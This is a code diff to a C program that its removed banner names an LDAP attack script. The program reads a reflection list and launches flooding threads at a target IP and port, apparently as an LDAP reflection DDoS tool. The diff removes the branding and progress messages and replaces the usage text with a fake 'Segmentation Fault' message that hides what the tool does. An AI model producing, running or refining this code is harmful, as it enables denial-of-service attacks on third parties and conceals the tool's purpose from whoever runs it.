@@ -131,14 +131,12 @@ void *flood(void *par1)
 int main(int argc, char *argv[ ])
 {
 	if(argc < 6){
-	fprintf(stderr, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mLDAP Attack Script.\n");
-	fprintf(stdout, "\e[38;5;202mInvalid Input || Please input the following:\e[38;5;202m %s IP PORT ldap.txt 2 -1 TIME\n", argv[0]);
+	fprintf(stdout, "Segmentation Fault\n");
 		exit(-1);
 	}
 	srand(time(NULL));
 	int i = 0;
 	head = NULL;
-	fprintf(stdout, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mReading Reflection List.\n");
 	int max_len = 128;
 	char *buffer = (char *) malloc(max_len);
 	buffer = memset(buffer, 0x00, max_len);
@@ -184,7 +182,6 @@ int main(int argc, char *argv[ ])
 		td[i].list_node = current;
 		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
 	}
-	fprintf(stdout, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mLDAP Attack Sent!\n");
 	for(i = 0;i<(atoi(argv[6])*multiplier);i++)
 	{
 		usleep((1000/multiplier)*1000);
